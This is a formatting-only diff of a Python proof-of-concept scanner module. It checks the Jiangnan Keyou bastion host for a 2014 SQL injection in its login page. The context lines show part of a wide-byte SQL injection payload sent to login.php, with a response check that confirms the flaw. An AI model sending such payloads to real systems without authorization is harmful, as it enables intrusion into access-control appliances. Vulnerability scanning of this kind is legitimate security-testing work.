@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Keyou_0002' # 平台漏洞编号，留空
+    vuln_id = 'Keyou_0002'  # 平台漏洞编号，留空
     name = '江南科友堡垒机 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-09-23'  # 漏洞公布时间
     desc = '''  
         江南科友运维安全审计系统（HAC）着眼于解决关键IT基础设施运维安全问题。
@@ -25,6 +26,7 @@ class Vuln(ABVuln):
     product = '江南科友堡垒机'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '51157d80-b9c8-4a7c-9fa7-92330f8cdeeb'
     author = '47bwy'  # POC编写者
@@ -37,8 +39,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #wooyun-2014-061617
+
+            # wooyun-2014-061617
             hh = hackhttp.hackhttp()
             arg = self.target
             path = '/login.php'
@@ -59,7 +61,7 @@ password_check=1&account=aaa%cf'+and+exists(select*from+(select*from(select+name
             '''
             code, head, res, errcode, _ = hh.http(target, raw=raw)
             if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
-                #security_hole(target)
+                # security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -68,6 +70,7 @@ password_check=1&account=aaa%cf'+and+exists(select*from+(select*from(select+name
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
